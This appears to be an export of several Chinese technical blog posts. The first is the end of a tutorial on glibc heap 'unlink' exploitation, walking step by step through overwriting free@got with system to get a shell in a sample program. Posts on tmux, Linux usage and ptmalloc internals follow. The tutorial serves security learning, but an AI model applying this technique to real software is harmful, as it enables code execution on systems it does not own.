<p>在执行 unlink（P）时的指针操作如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>）FD = P-&gt;fd = ptr - <span class="number">0xC</span>；</div><div class="line"><span class="number">2</span>）BK = P-&gt;bk = ptr - <span class="number">0x8</span>；</div><div class="line"><span class="comment">// FD-&gt;bk = ptr - 0xC + 0xC = ptr; BK-&gt;fd = ptr -0x8 + 0x8 = ptr;</span></div><div class="line"><span class="comment">// 由于 ptr 指向 P,可成功绕过指针校验</span></div><div class="line"><span class="number">3</span>）FD-&gt;bk = BK，即 ptr = ptr - <span class="number">0x8</span>;</div><div class="line"><span class="number">4</span>）BK-&gt;fd = FD，即 ptr = ptr - <span class="number">0xC</span>。</div></pre></td></tr></table></figure></p>
<p>由以上过程可知，借助指向 chunk P 的 ptr 指针可绕过 “corrupted double-linked list” 安全机制，并通过 unlink 攻击实现写内存，最终使得 ptr 指向 ptr - 0xc。</p>
<p>unlink 后，对 ptr 指向的内存进行写入，如 <code>‘A’*0xC + free@got</code>，使得 ptr 指向 free@got，再次对 ptr 指向的内存进行写入，可以把 free@got 修改为 system 的地址，之后调用 free 可任意命令执行。</p>
<h2 id="3-实例分析"><a href="#3-实例分析" class="headerlink" title="3. 实例分析"></a>3. 实例分析</h2><p>通过调试网上找的一个例子来具体分析 unlink 利用及其安全机制的绕过，相关文件可在 <a href="https://github.com/0x4C43/Linux-Exploit/tree/master/heap_unlink" target="_blank" rel="external">Github</a> 中下载。<br>程序功能为堆的 4 种基本操作：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> menu()</div><div class="line">&#123;</div><div class="line">  write(<span class="number">1</span>, <span class="string">"1.Add chunk\n"</span>, <span class="number">0xC</span>u);</div><div class="line">  write(<span class="number">1</span>, <span class="string">"2.Set chunk\n"</span>, <span class="number">0xC</span>u);</div><div class="line">  write(<span class="number">1</span>, <span class="string">"3.Delete chunk\n"</span>, <span class="number">0xF</span>u);</div><div class="line">  write(<span class="number">1</span>, <span class="string">"4.Print chunk\n"</span>, <span class="number">0xE</span>u);</div><div class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">"5.Exit\n"</span>, <span class="number">7u</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>程序中有一个全局指针数组用于存储每一个 malloc 所分配堆块返回的指针。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> *<span class="title">add</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">void</span> *result; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></div><div class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [esp+Ch] [ebp-Ch]</span></div><div class="line"></div><div class="line">  size = <span class="number">0</span>;</div><div class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">9</span> )</div><div class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)write(<span class="number">1</span>, <span class="string">"cannot add chunks!"</span>, <span class="number">0x12</span>u);</div><div class="line">  write(<span class="number">1</span>, <span class="string">"Input the size of chunk you want to add:"</span>, <span class="number">0x28</span>u);</div><div class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;size);</div><div class="line">  result = (<span class="keyword">void</span> *)size;</div><div class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)size &gt; <span class="number">0</span> )</div><div class="line">  &#123;</div><div class="line">    v1 = index++;</div><div class="line">    result = <span class="built_in">malloc</span>(size);</div><div class="line">    buf[v1] = result;  <span class="comment">// 把堆块指针保存到 buf 中</span></div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line"><span class="comment">// buf 为全局指针数组</span></div><div class="line">.bss:<span class="number">08049</span>D60 buf             dd ?                    ; DATA XREF: add+<span class="number">7</span>A↑w</div></pre></td></tr></table></figure></p>
<p>首先使用 <code>add</code>功能申请 4 个大小为 0x80 的堆（small chunk），程序会将 malloc 返回的用户空间指针 ptr_mem 存放在全局指针数组 buf[n] 中，该数组起始地址 buf 为 0x8049d60。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-12-31/74608133.jpg" alt=""><br>申请好堆后，使用 <code>set</code> 功能把字符串 “/bin/sh” 写入到 chunk3 中，为后面执行 system 函数做准备。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-12-31/40338931.jpg" alt=""><br>使用 <code>set</code> 功能编辑 chunk0 的内容可溢出并覆盖 chunk1，在 chunk0 中伪造一个大小为 0x80 的空闲 chunk P，将其 fd 和 bk 设置为 buf[0]-0xc 和 buf[0]-0x8，并且修改 chunk1 的 prev_size 和 size 字段。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-12-31/80701083.jpg" alt=""><br>接着使用 <code>delete</code> 释放 chunk1，由于相邻的 chunk P 为空闲块，会触发 unlink(P) 把 chunk P 从 smallbins 中解除，并与 chunk1 合并为大小为 0x108 的空闲块。unlink 过程中可绕过 “指针破坏” 检测，并实现写内存。最终会把 buf[0] 修改为 buf[0]-0xC。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-12-31/14873045.jpg" alt=""><br>使用 <code>set</code> 编辑 chunk0 可覆盖 buf[0]，从而再次修改 buf[0]，控制其指向的内存。可将其修改为 free@got。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-12-31/20886310.jpg" alt=""><br>接着使用 <code>print</code> 输出 chunk0 的内容，可泄露出内存中 free 函数的地址，从而可计算得到 system 函数的地址。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-12-31/4598652.jpg" alt=""><br>再次编辑 chunk0 的内容，把 system 的地址写入 free@got 中。写完后可查看 free@got 已指向 system 函数。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-12-31/20330158.jpg" alt=""><br>当使用 <code>delete</code> 删除 chunk3 时执行的 free(chunk3) 实际上是 system(“\bin\sh”)，从而成功 getshell。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-12-31/8077018.jpg" alt="">    </p>
<hr>
<p>References:<br>[1] <a href="https://jaq.alibaba.com/community/art/show?articleid=360" target="_blank" rel="external">Linux堆溢出漏洞利用之unlink</a><br>[2] <a href="http://wooyun.jozxing.cc/static/drops/tips-7326.html" target="_blank" rel="external">堆溢出的unlink利用方法</a><br>[3] <a href="http://pwn4.fun/2016/05/07/Heap-Overflow-Using-Unlink-Double-Free/" target="_blank" rel="external">Heap Overflow Using Unlink &amp; Double Free</a>    </p>
]]></content>
      
        <categories>
            
            <category> Exploit </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 堆溢出 </tag>
            
            <tag> unlink </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[终端复用工具 tmux]]></title>
      <url>/2017/1028/terminal-reuse-tool-tmux/</url>
      <content type="html"><![CDATA[<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>tmux 是一款很好用的终端复用工具，主要有以下两个功能：    </p>
<blockquote>
<p>1）split 窗口。可以在一个 terminal 下打开多个终端，也可以对当前屏幕进行各种 split ，即可以同时打开多个显示范围更小的终端。<br>2）在使用 SSH 的环境下，避免因网络不稳定而断开连接，导致工作现场的丢失。使用 tmux，重新连接以后，可以直接回到原来的工作环境，不但提高了工作 效率，还降低了风险，增加了安全性。</p>
</blockquote>
<p>tmux主要包括以下几个模块：</p>
<blockquote>
<p><strong>session 会话：</strong> 一个服务器可以包含多个会话；<br><strong>window 窗口：</strong> 一个会话可以包含多个窗口；<br><strong>pane 面板：</strong> 一个窗口可以包含多个面板。</p>
</blockquote>
<p>以下为会话管理命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">tmux [new <span class="_">-s</span> 会话名 -n 窗口名]	<span class="comment"># 启动新会话</span></div><div class="line">tmux at [-t 会话名]		<span class="comment"># 恢复会话</span></div><div class="line">tmux ls				<span class="comment"># 列出所有会话</span></div><div class="line">tmux <span class="built_in">kill</span>-session -t 会话名	<span class="comment"># 关闭会话</span></div></pre></td></tr></table></figure></p>
<h1 id="0x02-安装与使用"><a href="#0x02-安装与使用" class="headerlink" title="0x02 安装与使用"></a>0x02 安装与使用</h1><p>ubuntu 中使用以下命令安装 tmux。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install tmux</div></pre></td></tr></table></figure></p>
<h2 id="1-快捷键"><a href="#1-快捷键" class="headerlink" title="1. 快捷键"></a>1. 快捷键</h2><p>Pre 为前缀，默认为 Ctrl + b。</p>
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
<th>快捷键</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Pre Pgup</td>
<td style="text-align:left">向上翻页</td>
<td>Pre &amp;</td>
<td>关闭当前窗口</td>
</tr>
<tr>
<td style="text-align:left">Pre PgDn</td>
<td style="text-align:left">向下翻页</td>
<td>Pre Alt-[1-5]</td>
<td>切换面板的布局</td>
</tr>
<tr>
<td style="text-align:left">Pre s</td>
<td style="text-align:left">现有会话列表</td>
<td>Pre Space</td>
<td>切换面板布局</td>
</tr>
<tr>
<td style="text-align:left">Pre (</td>
<td style="text-align:left">前一个会话</td>
<td>Pre Ctl+o</td>
<td>顺序轮换面板</td>
</tr>
<tr>
<td style="text-align:left">Pre )</td>
<td style="text-align:left">后一个会话</td>
<td>Pre Alt+o</td>
<td>逆序轮换面板</td>
</tr>
<tr>
<td style="text-align:left">Pre c</td>
<td style="text-align:left">新建窗口</td>
<td>Pre {/}</td>
<td>上/下交换面板(swap-pane -U/-D)</td>
</tr>
<tr>
<td style="text-align:left">Pre ,</td>
<td style="text-align:left">改变窗口的名字</td>
<td>Pre o</td>
<td>当前窗口中切换面板</td>
</tr>
<tr>
<td style="text-align:left">Pre $</td>
<td style="text-align:left">改变会话的名字</td>
<td>Pre l/r/u/d</td>
<td>切换当前面板</td>
</tr>
<tr>
<td style="text-align:left">Pre c</td>
<td style="text-align:left">创建新窗口</td>
<td>Pre C-l/r/u/d</td>
<td>改变面板大小</td>
</tr>
<tr>
<td style="text-align:left">Pre p</td>
<td style="text-align:left">前一个窗口</td>
<td>Pre L/R/U/D</td>
<td>改变面板大小</td>
</tr>
<tr>
<td style="text-align:left">Pre n</td>
<td style="text-align:left">后一个窗口</td>
<td>Pre q</td>
<td>显示面板编号并选择</td>
</tr>
<tr>
<td style="text-align:left">Pre l</td>
<td style="text-align:left">前后窗口间切换</td>
<td>Pre x</td>
<td>关闭当前面板</td>
</tr>
<tr>
<td style="text-align:left">Pre [0-9]</td>
<td style="text-align:left">选择窗口</td>
<td>Pre %</td>
<td>纵向分隔窗口</td>
</tr>
<tr>
<td style="text-align:left">Pre f</td>
<td style="text-align:left">搜索窗口</td>
<td>Pre “</td>
<td>横向分隔窗口</td>
</tr>
<tr>
<td style="text-align:left">Pre w</td>
<td style="text-align:left">列出所有窗口并选择</td>
<td>Pre x</td>
<td>关闭面板</td>
</tr>
<tr>
<td style="text-align:left">Pre .</td>
<td style="text-align:left">移动窗口到新的编号</td>
<td>Pre !</td>
<td>关闭所有小面板</td>
</tr>
<tr>
<td style="text-align:left">Pre [</td>
<td style="text-align:left">进入复制模式</td>
<td>Pre b;Ctrl+方向键</td>
<td>调整面板大小</td>
</tr>
<tr>
<td style="text-align:left">Pre ]</td>
<td style="text-align:left">粘贴</td>
<td>Pre z</td>
<td>最大化当前面板</td>
</tr>
</tbody>
</table>
<h2 id="2-修改配置"><a href="#2-修改配置" class="headerlink" title="2. 修改配置"></a>2. 修改配置</h2><p>在 home 目录下新建配置文件 .tmux.conf，设置以下参数使得操作更方便。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#remap prefix from 'Ctr+b' to 'Ctr+a'</span></div><div class="line"><span class="comment">#unbind C-b</span></div><div class="line"><span class="comment">#set -g prefix C-a</span></div><div class="line"><span class="comment">#bind-key C-a send-prefix</span></div><div class="line"></div><div class="line"><span class="comment">#split panes using \and -</span></div><div class="line">bind \ split-window -h</div><div class="line">bind - split-window -v</div><div class="line">unbind <span class="string">'"'</span></div><div class="line">unbind %</div><div class="line"></div><div class="line"><span class="comment">#switch panes using Alt-arrow without prefix</span></div><div class="line">bind -n M-Left select-pane -L</div><div class="line">bind -n M-Right select-pane -R</div><div class="line">bind -n M-Up select-pane -U</div><div class="line">bind -n M-Down select-pane -D</div><div class="line"></div><div class="line"><span class="comment">#reload config file</span></div><div class="line">bind r source-file ~/.tmux.conf</div><div class="line"></div><div class="line"><span class="comment">#set mouse on</span></div><div class="line">set -g mouse on</div><div class="line"></div><div class="line"><span class="comment">#copy in vim mode</span></div><div class="line">setw -g mode-keys vi</div><div class="line"></div><div class="line"><span class="comment">#reserve in current path in new window</span></div><div class="line">bind c new-window -c <span class="string">"#&#123;pane_current_path&#125;"</span></div></pre></td></tr></table></figure></p>
<p>可通过以下方式使配置文件生效：    </p>
<blockquote>
<p>a）新建一个 session，配置文件在新的 session 中生效。<br>b）在当前 session 中，按 Pre + r 重新加载配置文件即可生效。</p>
</blockquote>
<h2 id="3-复制粘贴"><a href="#3-复制粘贴" class="headerlink" title="3. 复制粘贴"></a>3. 复制粘贴</h2><h3 id="1）-鼠标选中复制"><a href="#1）-鼠标选中复制" class="headerlink" title="1） 鼠标选中复制"></a>1） 鼠标选中复制</h3><p>在没有启动鼠标滚轮时，可以直接通过鼠标选中进行复制。如果启动滚轮，需要按下shift 键后使用鼠标选中要复制的内容。</p>
<h3 id="2）复制模式"><a href="#2）复制模式" class="headerlink" title="2）复制模式"></a>2）复制模式</h3><p>tmux 支持两种快捷键模式：vim 和 Emacs，这里设置为 vim 快捷键模式，在上述配置文件中已添加 <code>setw -g mode-keys vi</code>，可用 j/k/h/l 移动光标。    </p>
<p><strong>复制：</strong>    </p>
<blockquote>
<p>Pre + [ 进入复制模式；<br>按下 Space 键开始复制；<br>移动光标选中要复制的内容；<br>按 Enter 键完成复制。</p>
</blockquote>
<p><strong>粘贴</strong>    </p>
<blockquote>
<p>光标移到到粘贴位置；<br>按 Pre + ] 完成粘贴。</p>
<hr>
<p>References:<br>[1] <a href="https://wiki.freebsdchina.org/software/t/tmux" target="_blank" rel="external">使用tmux</a>   </p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> tmux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux 使用笔记]]></title>
      <url>/2017/1028/linux-usage-notes/</url>
      <content type="html"><![CDATA[<h1 id="0x01-基本命令"><a href="#0x01-基本命令" class="headerlink" title="0x01 基本命令"></a>0x01 基本命令</h1><h2 id="1-使用终端模式登录"><a href="#1-使用终端模式登录" class="headerlink" title="1. 使用终端模式登录"></a>1. 使用终端模式登录</h2><p>终端模式即命令行模式，Linux 系统默认提供6个终端（Teletype, tty1-tty6）；<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">使用 Ctrl+Alt+F1 进入 tty1 、... 、Ctrl+Alt+F6 进入 tty6</div><div class="line">使用 Ctrl+Alt+F7 回到桌面模式</div></pre></td></tr></table></figure></p>
<h2 id="2-分页显示"><a href="#2-分页显示" class="headerlink" title="2. 分页显示"></a>2. 分页显示</h2><p>终端模式下，输出的内容多于一屏时使用；<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cat file1 | less 或 less file1</div><div class="line">cat file1 | more 或 more file1</div></pre></td></tr></table></figure></p>
<h2 id="3-命令帮助"><a href="#3-命令帮助" class="headerlink" title="3. 命令帮助"></a>3. 命令帮助</h2><p>用于查看命令的使用说明；<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">man ls</div><div class="line">man -f reboot</div><div class="line">man <span class="number">2</span> reboot</div></pre></td></tr></table></figure></p>
<p>输入”/string“，按回车，查找关键字 string，n 键向下查找，N 键向上查找；<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-10-28/99556537.jpg" alt=""><br>-f 用于查询命令说明存在于哪些 man 文档文件中；<br>查看 reboot 命令在 man 文档的第二章中的解释；</p>
<p>同样可用 info ls 查看命令说明文档。</p>
<h2 id="4-命令行快捷键"><a href="#4-命令行快捷键" class="headerlink" title="4. 命令行快捷键"></a>4. 命令行快捷键</h2><p>常用:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Ctrl L：清屏</div><div class="line">Ctrl M：等效于回车</div><div class="line">Ctrl C: 中断正在当前正在执行的程序</div></pre></td></tr></table></figure></p>
<p>历史命令:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Ctrl P: 上一条命令，可以一直按表示一直往前翻</div><div class="line">Ctrl N: 下一条命令</div><div class="line">Ctrl R:再按历史命令中出现过的字符串：按字符串寻找历史命令（重度推荐）</div></pre></td></tr></table></figure></p>
<p>命令行编辑:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">Tab: 自动补齐</div><div class="line">Ctrl A：移动光标到命令行首</div><div class="line">Ctrl E: 移动光标到命令行尾</div><div class="line">Ctrl B: 光标后退</div><div class="line">Ctrl F: 光标前进</div><div class="line">Alt F: 光标前进一个单词</div><div class="line">Alt B: 光标后退一格单词</div><div class="line">Ctrl H: 删除光标的前一个字符</div><div class="line">Ctrl D: 删除当前光标所在字符</div><div class="line">Alt D: 删除当前单词</div><div class="line">Ctrl K：删除光标之后所有字符</div><div class="line">Ctrl U: 清空当前键入的命令</div><div class="line">Ctrl W: 删除光标前的单词(Word, 不包含空格的字符串)</div><div class="line">Ctrl Y: 粘贴Ctrl W或Ctrl K删除的内容</div><div class="line">Alt .: 粘贴上一条命令的最后一个参数（很有用）</div><div class="line">Ctrl X Ctrl E: 调出系统默认编辑器编辑当前输入的命令，退出编辑器时，命令执行</div></pre></td></tr></table></figure></p>
<p>其他:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Ctrl Z: 把当前进程放到后台（之后可用<span class="string">''</span><span class="built_in">fg</span><span class="string">''</span>命令回到前台）</div><div class="line">Ctrl PageUp: 屏幕输出向上翻页</div><div class="line">Ctrl PageDown: 屏幕输出向下翻页</div></pre></td></tr></table></figure></p>
<h1 id="0x02-系统配置"><a href="#0x02-系统配置" class="headerlink" title="0x02 系统配置"></a>0x02 系统配置</h1><h2 id="1-修改软件源"><a href="#1-修改软件源" class="headerlink" title="1. 修改软件源"></a>1. 修改软件源</h2><p>使用国内的 ubuntu 源速度会快很多。下面使用 ubuntu 16.04 的<a href="https://mirrors.ustc.edu.cn/repogen/" target="_blank" rel="external">科大源</a>，可以使用如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo sed -i &apos;s/archive.ubuntu.com/mirrors.ustc.edu.cn/g&apos; /etc/apt/sources.list</div></pre></td></tr></table></figure></p>
<p>或者直接编辑 /etc/apt/sources.list 文件，在文件最前面添加以下条目：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span></div><div class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ xenial main restricted universe multiverse</div><div class="line"><span class="comment"># deb-src https://mirrors.ustc.edu.cn/ubuntu/ xenial main main restricted universe multiverse</span></div><div class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse</div><div class="line"><span class="comment"># deb-src https://mirrors.ustc.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse</span></div><div class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</div><div class="line"><span class="comment"># deb-src https://mirrors.ustc.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</span></div><div class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</div><div class="line"><span class="comment"># deb-src https://mirrors.ustc.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</span></div><div class="line"><span class="comment"># 预发布软件源，不建议启用</span></div><div class="line"><span class="comment"># deb https://mirrors.ustc.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse</span></div><div class="line"><span class="comment"># deb-src https://mirrors.ustc.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse</span></div></pre></td></tr></table></figure></p>
<h2 id="2-添加-DNS-配置"><a href="#2-添加-DNS-配置" class="headerlink" title="2. 添加 DNS 配置"></a>2. 添加 DNS 配置</h2><p>直接修改 /etc/resolv.conf 重启会被覆盖，使用以下两种方法设置可避免该问题。<br><strong>a）修改文件/etc/network/interfaces</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># interfaces(5) file used by ifup(8) and ifdown(8)</span></div><div class="line"><span class="comment"># auto lo</span></div><div class="line"><span class="comment"># iface lo inet loopback</span></div><div class="line"></div><div class="line">auto eth0    </div><div class="line">iface eth0 inet static    </div><div class="line">address <span class="number">192.168</span><span class="number">.3</span><span class="number">.250</span>    <span class="comment"># IP    </span></div><div class="line">netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>    <span class="comment"># netmask    </span></div><div class="line">gateway <span class="number">192.168</span><span class="number">.3</span><span class="number">.1</span>      <span class="comment"># gateway    </span></div><div class="line">dns-nameservers <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span>  <span class="comment"># DNS</span></div></pre></td></tr></table></figure></p>
<p><strong>b）修改文件 /etc/resolvconf/resolv.conf.d/base</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nameserver <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></div><div class="line">nameserver <span class="number">223.5</span><span class="number">.5</span><span class="number">.5</span></div></pre></td></tr></table></figure></p>
<h2 id="3-设置环境变量"><a href="#3-设置环境变量" class="headerlink" title="3. 设置环境变量"></a>3. 设置环境变量</h2><p><strong>a）全局环境变量</strong><br>全局环境变量，对所有用户都会生效。</p>
<ul>
<li>etc/profile: 此文件为系统的每个用户设置环境信息。当用户登录时，该文件被执行一次，并从 /etc/profile.d 目录的配置文件中搜集 shell 的设置。    </li>
<li>/etc/bashrc: 当 bash shell 被打开时，该文件被读取。</li>
</ul>
<p><strong>b）用户环境变量</strong></p>
<ul>
<li>~/.bash_profile 或 ~/.profile: 只对单个用户生效，当用户登录时该文件执行一次。用户可使用该文件添加自己使用的 shell 变量信息。</li>
<li>~/.bashrc: 只对单个用户生效，当打开新的 shell 时，该文件被读取。</li>
</ul>
<p><strong>c）系统环境变量</strong><br> /etc/environment 设置的是整个系统的环境，而/etc/profile是设置所有用户的环境。<br> 使用 source /etc/environment 可以使变量设置在当前窗口立即生效</p>
<h2 id="4-设置代理"><a href="#4-设置代理" class="headerlink" title="4. 设置代理"></a>4. 设置代理</h2><p>可在 /etc/environment 中添加以下环境变量。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http_proxy=<span class="string">"http://ip:port/"</span></div><div class="line">https_proxy=<span class="string">"https://ip:port/"</span></div><div class="line">ftp_proxy=<span class="string">"ftp://ip:port/"</span></div><div class="line">socks_proxy=<span class="string">"socks://ip:port/"</span></div><div class="line">all_proxy=<span class="string">"https://ip:port/"</span></div></pre></td></tr></table></figure></p>
<h1 id="0x03-工具"><a href="#0x03-工具" class="headerlink" title="0x03 工具"></a>0x03 工具</h1><h2 id="1）oh-my-zsh"><a href="#1）oh-my-zsh" class="headerlink" title="1）oh-my-zsh"></a>1）oh-my-zsh</h2><h2 id="2）tmux"><a href="#2）tmux" class="headerlink" title="2）tmux"></a>2）tmux</h2><h2 id="3）ipython"><a href="#3）ipython" class="headerlink" title="3）ipython"></a>3）ipython</h2><hr>
<p>References:<br>[1] <a href="https://gist.github.com/zhulianhua/befb8f61db8c72b4763d" target="_blank" rel="external">Linux 命令行编辑快捷键</a>   </p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux 内存管理与堆]]></title>
      <url>/2017/1024/linux-memory-management-and-heap/</url>
      <content type="html"><![CDATA[<p>目前各大平台主要有如下几种堆内存管理机制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">dlmalloc – General purpose allocator</div><div class="line">ptmalloc2 – glibc</div><div class="line">jemalloc – FreeBSD and Firefox</div><div class="line">tcmalloc – Google</div><div class="line">libumem – Solaris</div></pre></td></tr></table></figure></p>
<p>Linux 的早期版本使用的默认内存分配器为 dlmalloc，Wolfram Gloger 在 dlmalloc 基础上改进的 ptmalloc2 提供了多线程支持，所以 Linux 后来采用 ptmalloc2 作为默认内存分配器。多线程支持可以提升内存分配器的性能，进而提升了应用程序的性能。</p>
<p>在dlmalloc中，当多个线程同时调用malloc时，因为空闲列表被所有线程共享，所以只有一个线程能够访问临界区。因此，使用dlmalloc的多线程程序会在内存分配上耗费过多时间，导致整体性能下降。而在ptmalloc2中，每个线程都维护着一个独立的堆段，维护这些堆的空闲列表也是独立的。当有两个线程同时调用malloc时，均可立即分配到内存。</p>
<p>下面结合 unbuntu glibc 2.19 环境来学习内存的分配与回收。</p>
<h1 id="0x01-内存管理数据结构"><a href="#0x01-内存管理数据结构" class="headerlink" title="0x01 内存管理数据结构"></a>0x01 内存管理数据结构</h1><p>堆内存管理过程中有三个重要概念，分别是：arena、chunk、bin。</p>
<h2 id="1-arena"><a href="#1-arena" class="headerlink" title="1. arena"></a>1. arena</h2><p>程序在第一次使用 malloc 申请内存时，系统会分配一段连续的堆内存（132KB），这段内存被称为 arena。当程序申请再次申请内存时会先从 arena 的剩余部分申请，直到用完时再增加 arena 的大小。同理，当 arena中有过多空闲内存时也会缩小 arena 的大小。</p>
<p>为了使 dlmalloc 可以支持多线程，ptmalloc 增加了非主分配区（non main arena）支持。由主线程创建的 arena 称为主分配区（main arena），由其它线程创建的 arena 称为非主分配区（non main arena）。主分配区与非主分配区用环形链表进行管理。每一个分配区利用互斥锁（mutex）使线程对于该分配区的访问互斥。</p>
<p>每个进程只有一个主分配区，但可能存在多个非主分配区，ptmalloc 根据系统对分配区的争用情况动态增加非主分配区的数量，分配区的数量一旦增加，就不会再减少了。</p>
<p>主分配区可以使用 sbrk 和 mmap 向操作系统申请虚拟内存。非主分配区只能使用 mmap 向操作系统申请虚拟内存。</p>
